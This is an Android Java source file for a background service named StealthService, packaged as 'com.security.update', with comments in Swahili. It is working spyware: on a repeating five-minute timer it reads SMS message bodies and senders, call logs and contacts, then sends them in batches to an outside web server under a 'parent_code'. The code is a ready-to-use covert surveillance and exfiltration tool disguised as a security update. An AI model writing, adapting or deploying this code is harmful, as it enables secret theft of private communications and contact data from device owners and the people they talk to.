package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private int smsCount = 0;
    private int callsCount = 0;
    private int contactsCount = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        Log.d(TAG, "🔍 StealthService imeanzishwa...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
        } else {
            parentCode = prefs.getString("parent_code", "");
        }

        startDataCollection();
        return START_STICKY;
    }

    private void startDataCollection() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Anza kukusanya data mara moja
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAllData();
            }
        }, 5000);

        // Rudia kila baada ya dakika 5
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAllData();
            }
        }, 300000, 300000); // 5 minutes = 300000 ms
    }

    private void collectAllData() {
        Log.d(TAG, "🔄 Kuanza kukusanya data...");

        // 1. Kusanya SMS (10,000 kwa kila cycle)
        if (checkPermission(Manifest.permission.READ_SMS)) {
            collectSMSData();
        }

        // 2. Kusanya simu (10,000 kwa kila cycle)
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            collectCallsData();
        }

        // 3. Kusanya anwani (10,000 kwa kila cycle)
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            collectContactsData();
        }

        Log.d(TAG, "✅ Ukusaji wa data umekamilika");
    }

    private void collectSMSData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 10000"
                );

                if (cursor != null) {
                    JSONArray smsBatch = new JSONArray();
                    int count = 0;

                    while (cursor.moveToNext() && count < 10000) {
                        try {
                            JSONObject smsData = new JSONObject();
                            String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                            smsData.put("sender", address != null ? address : "Unknown");
                            smsData.put("message", body != null ? body : "");
                            smsData.put("timestamp", timestamp);
                            smsData.put("type", getSMSType(type));

                            smsBatch.put(smsData);
                            count++;

                            // Tuma kila 100 SMS
                            if (count % 100 == 0) {
                                sendBatchDataToServer("sms", smsBatch);
                                smsBatch = new JSONArray();
                                Thread.sleep(1000);
                            }

                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing SMS: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho
                    if (smsBatch.length() > 0) {
                        sendBatchDataToServer("sms", smsBatch);
                    }

                    cursor.close();
                    smsCount += count;
                    Log.d(TAG, "✅ SMS " + count + " zimetumwa (Jumla: " + smsCount + ")");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
            }
        }).start();
    }

    private void collectCallsData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 10000"
                );

                if (cursor != null) {
                    JSONArray callsBatch = new JSONArray();
                    int count = 0;

                    while (cursor.moveToNext() && count < 10000) {
                        try {
                            JSONObject callData = new JSONObject();
                            String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                            long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                            callData.put("number", number != null ? number : "Unknown");
                            callData.put("duration", duration);
                            callData.put("timestamp", timestamp);
                            callData.put("type", getCallTypeText(type));

                            callsBatch.put(callData);
                            count++;

                            // Tuma kila 100 simu
                            if (count % 100 == 0) {
                                sendBatchDataToServer("calls", callsBatch);
                                callsBatch = new JSONArray();
                                Thread.sleep(1000);
                            }

                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing call: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho
                    if (callsBatch.length() > 0) {
                        sendBatchDataToServer("calls", callsBatch);
                    }

                    cursor.close();
                    callsCount += count;
                    Log.d(TAG, "✅ Simu " + count + " zimetumwa (Jumla: " + callsCount + ")");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
            }
        }).start();
    }

    private void collectContactsData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 10000"
                );

                if (cursor != null) {
                    JSONArray contactsBatch = new JSONArray();
                    int count = 0;

                    while (cursor.moveToNext() && count < 10000) {
                        try {
                            String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                            String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                            String phoneNumber = getContactPhoneNumber(contactId);
                            
                            if (phoneNumber != null && !phoneNumber.isEmpty()) {
                                JSONObject contactData = new JSONObject();
                                contactData.put("name", name != null ? name : "Unknown");
                                contactData.put("phone", phoneNumber);
                                contactData.put("timestamp", System.currentTimeMillis());

                                contactsBatch.put(contactData);
                                count++;

                                // Tuma kila 100 anwani
                                if (count % 100 == 0) {
                                    sendBatchDataToServer("contacts", contactsBatch);
                                    contactsBatch = new JSONArray();
                                    Thread.sleep(1000);
                                }
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing contact: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho
                    if (contactsBatch.length() > 0) {
                        sendBatchDataToServer("contacts", contactsBatch);
                    }

                    cursor.close();
                    contactsCount += count;
                    Log.d(TAG, "✅ Anwani " + count + " zimetumwa (Jumla: " + contactsCount + ")");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
            }
        }).start();
    }

    private String getContactPhoneNumber(String contactId) {
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                phoneCursor.close();
                return phone;
            }
            if (phoneCursor != null) {
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone number: " + e.getMessage());
        }
        return null;
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            default: return "unknown";
        }
    }

    private String getSMSType(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "incoming";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "outgoing";
            default: return "unknown";
        }
    }

    private void sendBatchDataToServer(String dataType, JSONArray dataBatch) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("data_batch", dataBatch);
                postData.put("batch_size", dataBatch.length());

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " batch ya " + dataBatch.length() + " imetumwa");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 Service imezimwa");
    }
}
